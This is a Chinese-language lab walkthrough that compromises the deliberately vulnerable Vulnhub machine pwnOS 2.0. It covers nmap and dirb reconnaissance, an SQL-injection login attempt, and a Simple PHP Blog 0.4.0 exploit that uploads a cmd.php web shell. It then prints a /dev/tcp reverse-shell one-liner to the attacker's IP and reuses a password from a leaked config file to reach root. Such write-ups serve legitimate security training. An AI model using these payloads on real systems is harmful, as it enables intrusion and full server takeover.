---
title: Vulnhub靶机--pwnos2.0
date: 2026-08-06 20:20:00
categories: 靶机系列
tags:
- 渗透
- vulnhub
- 提权
---

# Vulnhub靶机--PWNOS2.0（解法一）

### 一.主机发现和信息收集

```shell
╭─ /home/kali 、 with root@kali at 06:54:54 ─╮
╰─❯ nmap -sn 192.168.84.0/24                ─╯                                                                                                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-06 06:57 EDT
Nmap scan report for 192.168.84.50
Host is up (0.00017s latency).
MAC Address: 70:08:94:2E:B7:41 (Unknown)
Nmap scan report for 192.168.84.247
Host is up (0.00040s latency).
MAC Address: 00:0C:29:45:9C:E1 (VMware)
Nmap scan report for 192.168.84.248
Host is up (0.050s latency).
MAC Address: 86:24:23:7D:AC:BA (Unknown)
Nmap scan report for 192.168.84.182
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.45 seconds

```

靶机的ip地址为192.168.84.248

```shell
╭─ /home/kali  took 11s with root@kali at 06:58:22 ─╮
╰─❯ nmap -sT --min-rate 10000 -p- 192.168.84.247   ─╯                                                                                                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-06 06:59 EDT
Nmap scan report for 192.168.84.247
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:45:9C:E1 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds

```

深度信息收集  

```shell
╭─ /home/kali ················································ with root@kali at 06:59:47 ─╮
╰─❯ nmap -sT -sC -p22,80 -sV -O 192.168.84.247                                            ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-06 07:00 EDT
Nmap scan report for 192.168.84.247
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
|_http-server-header: Apache/2.2.17 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Welcome to this Site!
MAC Address: 00:0C:29:45:9C:E1 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.32 - 2.6.39
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.22 seconds

```

开放了80,22端口 服务器大概率是linux系统 

使用UDP扫描：

```shell
╭─ /home/kali ·········································· х INT with root@kali at 07:04:55 ─╮
╰─❯ nmap -sU 192.168.84.247 --min-rate 10000                                              ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-06 07:05 EDT
Nmap scan report for 192.168.84.247
Host is up (0.0020s latency).
Not shown: 994 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
3296/udp  closed rib-slm
17762/udp closed unknown
40622/udp closed unknown
45722/udp closed unknown
49171/udp closed unknown
57977/udp closed unknown
MAC Address: 00:0C:29:45:9C:E1 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds

```

UDP端口是关闭的 最后进行基础的脆弱性扫描：

```shell
╭─ /home/kali  took 8s with root@kali at 07:00:21 ─╮
╰─❯ nmap --script=vuln 192.168.84.247             ─╯                                                                                                         
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-06 07:06 EDT
Nmap scan report for 192.168.84.247
Host is up (0.0029s latency).                                                                                                                                    
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.84.247
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.84.247:80/register.php
|     Form id: 
|     Form action: register.php
|     
|     Path: http://192.168.84.247:80/login.php
|     Form id: 
|_    Form action: login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       httponly flag not set
|   /login.php: 
|     PHPSESSID: 
|       httponly flag not set
|   /login/: 
|     PHPSESSID: 
|       httponly flag not set
|   /index/: 
|     PHPSESSID: 
|       httponly flag not set
|   /register/: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /blog/: Blog
|   /login.php: Possible admin folder
|   /login/: Login page
|   /info.php: Possible information file
|   /icons/: Potentially interesting folder w/ directory listing
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.2.17 (ubuntu)'
|   /index/: Potentially interesting folder
|   /info/: Potentially interesting folder
|_  /register/: Potentially interesting folder
MAC Address: 00:0C:29:45:9C:E1 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 31.31 seconds

```

扫描出来了一些目录，下面我们正式进入web渗透阶段

### 二.Web渗透测试

先打开网站对信息进行观察

{% asset_img image-20260806191049614.png %}

IsIntS 我们初步判断为一个CMS 以及首页上存在关键信息：

admin@isints.com  我们推测为后台的账户登录名 ，ctrl+u查看页面源码

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
	<title>Welcome to this Site!</title>
<style type="text/css" media="screen">@import "includes/layout.css";</style>
</head>
<body>
<div id="Header">IsIntS</div>
<div id="Content">
<!-- End of Header -->
<h1>Welcome</h1><p>Welcome to my IsIntS Internal Website.</p>
<p>If you have any questions email me at admin@isints.com</p>

<!-- End of Content -->
</div>

<div id="Menu">
<a href="index.php" title="Home Page">Home</a><br />
<a href="register.php" title="Register for the Site">Register</a><br />
<a href="login.php" title="Login">Login</a><br />
</div>
</body>
</html>

```

没有什么值得观察的信息 下面来目录爆破

```shell
╭─ /home/kali  х 255 with root@kali at 07:16:54 ─╮
╰─❯ dirb "http://192.168.84.247/"               ─╯                                                                                                            

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Aug  6 07:17:06 2026
URL_BASE: http://192.168.84.247/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.84.247/ ----
+ http://192.168.84.247/activate (CODE:302|SIZE:0)                                                                                                              
==> DIRECTORY: http://192.168.84.247/blog/                                                                                                                      
+ http://192.168.84.247/cgi-bin/ (CODE:403|SIZE:290)                                                                                                            
==> DIRECTORY: http://192.168.84.247/includes/                                                                                                                  
+ http://192.168.84.247/index (CODE:200|SIZE:854)                                                                                                               
+ http://192.168.84.247/index.php (CODE:200|SIZE:854)                                                                                                           
+ http://192.168.84.247/info (CODE:200|SIZE:50197)                                                                                                              
+ http://192.168.84.247/info.php (CODE:200|SIZE:50066)                                                                                                          
+ http://192.168.84.247/login (CODE:200|SIZE:1174)                                                                                                              
+ http://192.168.84.247/register (CODE:200|SIZE:1562)                                                                                                           
+ http://192.168.84.247/server-status (CODE:403|SIZE:295)                                                                                                       
                                                                                                
---- Entering directory: http://192.168.84.247/blog/ ----
+ http://192.168.84.247/blog/add (CODE:302|SIZE:0)                                                                                                              
+ http://192.168.84.247/blog/atom (CODE:200|SIZE:1068)                                                                                                          
+ http://192.168.84.247/blog/categories (CODE:302|SIZE:0)                                                                                                       
+ http://192.168.84.247/blog/comments (CODE:302|SIZE:0)                                                                                                         
==> DIRECTORY: http://192.168.84.247/blog/config/                                                                                                               
+ http://192.168.84.247/blog/contact (CODE:200|SIZE:6574)                                                                                                       
==> DIRECTORY: http://192.168.84.247/blog/content/                                                                                                              
+ http://192.168.84.247/blog/delete (CODE:302|SIZE:0)                                                                                                           
==> DIRECTORY: http://192.168.84.247/blog/docs/                                                                                                                 
==> DIRECTORY: http://192.168.84.247/blog/flash/                                                                                                                
==> DIRECTORY: http://192.168.84.247/blog/images/                                                                                                               
+ http://192.168.84.247/blog/index (CODE:200|SIZE:8698)                                                                                                         
+ http://192.168.84.247/blog/index.php (CODE:200|SIZE:8698)                                                                                                     
+ http://192.168.84.247/blog/info (CODE:302|SIZE:0)                                                                                                             
+ http://192.168.84.247/blog/info.php (CODE:302|SIZE:0)                                                                                                         
==> DIRECTORY: http://192.168.84.247/blog/interface/                                                                                                            
==> DIRECTORY: http://192.168.84.247/blog/languages/                                                                                                            
+ http://192.168.84.247/blog/login (CODE:200|SIZE:6323)                                                                                                         
+ http://192.168.84.247/blog/logout (CODE:302|SIZE:0)                                                                                                           
+ http://192.168.84.247/blog/options (CODE:302|SIZE:0)                                                                                                          
+ http://192.168.84.247/blog/rdf (CODE:200|SIZE:1425)                                                                                                           
+ http://192.168.84.247/blog/rss (CODE:200|SIZE:1249)                                                                                                           
==> DIRECTORY: http://192.168.84.247/blog/scripts/                                                                                                              
+ http://192.168.84.247/blog/search (CODE:200|SIZE:5607)                                                                                                        
+ http://192.168.84.247/blog/setup (CODE:302|SIZE:0)                                                                                                            
+ http://192.168.84.247/blog/static (CODE:302|SIZE:0)                                                                                                           
+ http://192.168.84.247/blog/stats (CODE:200|SIZE:6116)                                                                                                         
==> DIRECTORY: http://192.168.84.247/blog/themes/                                                                                                               
+ http://192.168.84.247/blog/trackback (CODE:302|SIZE:0)                                                                                                        
+ http://192.168.84.247/blog/upgrade (CODE:302|SIZE:0)                                                                                                          
                                                                                                
---- Entering directory: http://192.168.84.247/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                
---- Entering directory: http://192.168.84.247/blog/config/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                
---- Entering directory: http://192.168.84.247/blog/content/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                
---- Entering directory: http://192.168.84.247/blog/docs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                
---- Entering directory: http://192.168.84.247/blog/flash/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                
---- Entering directory: http://192.168.84.247/blog/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                
---- Entering directory: http://192.168.84.247/blog/interface/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                
---- Entering directory: http://192.168.84.247/blog/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                
---- Entering directory: http://192.168.84.247/blog/scripts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                
---- Entering directory: http://192.168.84.247/blog/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                
-----------------
END_TIME: Thu Aug  6 07:17:23 2026
DOWNLOADED: 9224 - FOUND: 30

```

我们发现了http://192.168.84.247/login 登录进去看一下

{% asset_img image-20260806195304577.png %}

'1 or 1=1'--  来初步判断一下存不存在万能密码

admin/'1 or 1=1 '--   

无法登录 暂时先放一边 寻找其他突破口 ：查看/blog页面看看是否存在突破口：

{% asset_img image-20260806200424211.png %}

看着像一个CMS小型内容管理系统  里面有搜索，联系方式以及登录页面 另外还存在一个博客文章 我们来分析一下：

{% asset_img image-20260806200811742.png %}

从内容得知，这是一个ISINT组织的博客 而ISINT并非一个CMS系统  进行深度信息收集查看源码：

发现有这么一行:

```html
alt="Powered by Simple PHP Blog 0.4.0" title="Powered by Simple PHP Blog 0.4.0
```

我们由此得知 该内容管理系统为Simple PHP Blog 版本为0.4.0  使用searchsploit 搜索Simple PHP Blog 0.4.0 看看有没有历史漏洞

```shell
┌──(kali㉿kali)-[~]
└─$ searchsploit Simple PHP Blog 0.4.0  
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Simple PHP Blog 0.4 - 'colors.php' Multiple Cross-Site Scripting Vulnerabilities           | cgi/webapps/26463.txt
Simple PHP Blog 0.4 - 'preview_cgi.php' Multiple Cross-Site Scripting Vulnerabilities      | cgi/webapps/26461.txt
Simple PHP Blog 0.4 - 'preview_static_cgi.php' Multiple Cross-Site Scripting Vulnerabiliti | cgi/webapps/26462.txt
Simple PHP Blog 0.4.0 - Multiple Remote s                                                  | php/webapps/1191.pl
Simple PHP Blog 0.4.0 - Remote Command Execution (Metasploit)                              | php/webapps/16883.rb
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

最后一个是命令执行 在实战中命令执行不是优先选择的点 我们注意到- Multiple Remote s 的perl脚本 我们将脚本复制到桌面 执行：

```perl
________________________________________________________________________________
                  SimplePHPBlog v0.4.0 Exploits
                             by
                     Kenneth F. Belva, CISSP
                   http://www.ftusecurity.com
________________________________________________________________________________

        Program : 1191.pl
        Version : v0.1
        Date    : 8/25/2005
        Descript: This perl script demonstrates a few flaws in
                  SimplePHPBlog.

        Comments: THIS PoC IS FOR EDUCATIONAL PURPOSES ONLY...
                  DO NOT RUN THIS AGAINST SYSTEMS TO WHICH YOU DO
                  NOT HAVE PERMISSION TO DO SO!

                  Please see this script comments for solution/fixes
                  to demonstrated vulnerabilities.
                  http://www.simplephpblog.com

        Usage   : 1191.pl [-h host] [-e exploit]

                -?      : this menu
                -h      : host
                -e      : exploit
                        (1)     : Upload cmd.php in [site]/images/
                        (2)     : Retreive Password file (hash)
                        (3)     : Set New User Name and Password
                                [NOTE - uppercase switches for exploits]
                                -U      : user name
                                -P      : password
                        (4)     : Delete a System File
                                -F      : Path and System File

        Examples: 1191.pl -h 127.0.0.1 -e 2
                  1191.pl -h 127.0.0.1 -e 3 -U l33t -P l33t
                  1191.pl -h 127.0.0.1 -e 4 -F ./index.php
                  1191.pl -h 127.0.0.1 -e 4 -F ../../../etc/passwd
                  1191.pl -h 127.0.0.1 -e 1
        #                                                      
```

该脚本包含了多个漏洞的利用集合，我们查看用法：

```
 1191.pl -h 目标 -e 漏洞模块 .....
```

选择文件上传漏洞：

```
perl 1191.pl -h 192.168.84.247 -e 1   
```

通过信息，我们判断一句话shell放在image目录下：

http://192.168.84.247/blog/images/

执行命令：http://192.168.84.247/blog/images/cmd.php?cmd=ls

```shell
Command: ls


a.php
cmd.php
image.sh
reset.php
shell.php
typescript
update.sh

```

### 三.权限提升

使用反向shell命令将对方的终端发送到攻击机：

```shell
sh -i 5<> /dev/tcp/192.168.84.182/4444 0<&5 1>&5 2>&5
```

```shell
www-data@web:/var/www/blog$ sudo -l
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
sudo: 3 incorrect password attempts
www-data@web:/var/www/blog$ sudo -l
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
sudo: 3 incorrect password attempts
www-data@web:/var/www/blog$ 

```

接下来进行主机信息收集： 先查看内核版本：

uname -r 

```shell
www-data@web:/var/www/blog$ uname -a
Linux web 2.6.38-8-server #42-Ubuntu SMP Mon Apr 11 03:49:04 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
```

接下来查看/var/www下的文件;

```php
<?php # Script 8.2 - mysqli_connect.php

// This file contains the database access information.
// This file also establishes a connection to MySQL
// and selects the database.

// Set the database access information as constants:

DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'goodday');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');

// Make the connection:

$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );

?>
```

发现goodday 疑似ssh的密码试着连一下：root:goodday 无法登录成功，接下来查看 /etc/passwd的文件：

```
www-data@web:/var/www$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
landscape:x:104:110::/var/lib/landscape:/bin/false
dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash

```

该密码的拥有者会不会是dan呢？

查看一下：

{% asset_img image-20260806204756523.png %}

好吧 依然不行 继续看看别的地方：

```php
www-data@web:/var$ ls
backups  crash       lib    lock  mail                opt  spool  uploads
cache    index.html  local  log   mysqli_connect.php  run  tmp    www
www-data@web:/var$ 
```

在/var目录下发现了又一个mysqli_connect.php  继续查看：

```php
www-data@web:/var$ cat mysqli_connect.php
<?php # Script 8.2 - mysqli_connect.php

// This file contains the database access information.
// This file also establishes a connection to MySQL
// and selects the database.

// Set the database access information as constants:

DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'root@ISIntS');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');

// Make the connection:

$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );

?>
```

发现疑似root的密码，查看是否能使用：

{% asset_img image-20260806205434867.png %}

可以看到成功提升至root权限 ，整台靶机到此结束
